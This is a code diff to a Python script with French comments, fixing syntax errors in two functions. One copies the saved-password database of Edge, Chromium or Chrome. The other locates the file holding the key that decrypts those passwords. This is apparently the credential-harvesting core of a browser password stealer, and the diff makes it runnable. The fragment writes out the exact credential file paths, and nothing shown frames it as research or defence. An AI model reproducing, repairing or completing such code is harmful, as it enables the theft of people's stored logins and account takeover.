@@ -18,10 +18,10 @@ v10 = 1  # Indice du tableau 'counter'
 
 # Copie le fichier contenant les mots de passes (pour permissions)
 def init_db(browser):
-    if browser = 3:
+    if browser == 3:
         path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Microsoft\Edge\User Data\Default\Login Data")
         db_path = os.path.abspath(getenv("APPDATA") + r"\..\..\LoginFile")
-    else if brower = 2:
+    elif browser == 2:
         path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Chromium\User Data\Default\Login Data")
         db_path = os.path.abspath(getenv("APPDATA") + r"\..\..\LoginFile")
     else :
@@ -33,9 +33,9 @@ def init_db(browser):
 
 # Récupère la clé utilisée pa os_crypt
 def get_os_crypt_key(browser):
-    if browser = 3 :
+    if browser == 3 :
         pref_service_path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Microsoft\Edge\User Data\Local State")
-    else if browser = 2 :
+    elif browser == 2 :
         pref_service_path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Chromium\User Data\Local State")
     else :
         pref_service_path = os.path.abspath(getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\Local State")
